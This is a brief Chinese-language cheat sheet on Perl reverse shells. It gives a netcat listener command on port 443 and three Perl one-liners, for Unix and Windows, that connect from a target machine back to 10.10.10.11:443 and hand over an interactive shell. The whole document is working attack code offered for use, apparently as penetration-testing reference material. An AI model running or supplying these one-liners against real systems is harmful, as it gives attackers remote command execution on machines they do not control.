# Perl脚本反弹shell

首先在本地监听TCP协议443端口

```
nc -lvp 443

```

然后在靶机上执行如下命令：

```perl
perl -e 'use Socket;$i="10.10.10.11";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.11:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

```

win平台下执行：

```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.10.11:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

```

